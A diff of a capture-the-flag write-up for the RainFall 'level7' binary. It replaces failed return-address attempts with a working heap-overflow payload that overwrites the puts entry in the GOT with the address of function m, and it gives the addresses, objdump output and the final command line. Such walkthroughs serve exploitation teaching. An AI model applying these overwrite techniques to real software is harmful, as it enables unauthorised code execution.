@@ -14,15 +14,13 @@ we will try to overwrite call to function `puts` to call to function `m` to read
 0x80484f4 <m>:	0x83e58955
 ```
 
-<!-- 0x8048400 puts plt ???? -->
+We try to overwrite the GOT table
 
-<!-- Adress of puts plt = `0x8048400` == `\x00\x84\x04\x08` -->
-
-Address of puts = `0xb7e927e0` == `\xe0\x27\xe9\xb7`
+Address of puts@GOT 08049928 -->\x28\x99\x04\x08
 
 Address of m = `0x080484f4` == `\xf4\x84\x04\x08`
 
-### How to overwrite address of puts ?
+### How to overwrite address of got ?
 
 Through a heap buffer overflow !
 
@@ -43,69 +41,26 @@ Through a heap buffer overflow !
 0x804a0c0:	0x00000000	0x00000000
 ```
 
-With `argv[1]` we will write in `str1`. we will overflow to write the return address of `main` on address of `str2`
+With `argv[1]` we will write in `str1`. we will overflow to write the address of `m` on the address of `put` in the got table
 
-`"A" * 20 + "\xe0\x27\xe9\xb7"`
+so first we have to overwrite the address of the 2nd structure on the heap with the address of `put` in got
 
-The second strcpy will write argv[2] on the return address of `main`. This way we can write the address of `m` instead
-
-Lets try to write m at the return address of main
-
-```
-(gdb) print $esp
-$2 = (void *) 0xbffff710
-```
-
-<!-- `0xbffff710` - 3c (60) = `BFFFF6D4` == `\xd4\xf6\xff\xbf` -->
-
-`0xbffff710` == `\x10\xf7\xff\xbf`
-
-### Payload
-
-```
-./level7 `(python -c 'print ("A" * 20 + "\return address main")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
-```
-
-try1 with `0xbffff710`
-
-```
-./level7 `(python -c 'print ("A" * 20 + "\x10\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
-```
-
-`* 152` = valide
-`* 153` = segfault
-
----
-
-try 2 with `0xbffff70f` (0xbffff710 - 1 ) == `\x0f\xf7\xff\xbf`
-
-```
-./level7 `(python -c 'print ("A" * 20 + "\x0f\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 1)')`
-```
-
-`* 1` = segfault
-
----
-
-try 2 with `0xbffff70e` (0xbffff710 - 2 ) == `\x0f\xf7\xff\xbf`
-
-```
-./level7 `(python -c 'print ("A" * 20 + "\x0f\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 2)')`
-```
-
-<!-- ```
-./level7 `(python -c 'print ("A" * 20 + "\xe0\x27\xe9\xb7")')` `(python -c 'print ("\xf4\x84\x04\x08")')`
-```
-
-./level7 `(python -c 'print ("A" * 20 + "\x00\x84\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08")')` -->
-
-Address of puts in the GOT
+Address of puts in the GOT:
 
 ```
 level7@RainFall:~$ objdump -R level7 | grep puts
 08049928 R_386_JUMP_SLOT   puts
 ```
+
 `08049928` == `\x28\x99\x04\x08`
+
+`"A" * 20 + "\x28\x99\x04\x08" `
+
+when we arrive at the second strcpy we can write the value of m inside the overwrited pointer of put in GOT
+
+`\xf4\x84\x04\x08`
+
+### Payload
 
 ```
 ./level7 `(python -c 'print ("A" * 20 + "\x28\x99\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08")')`
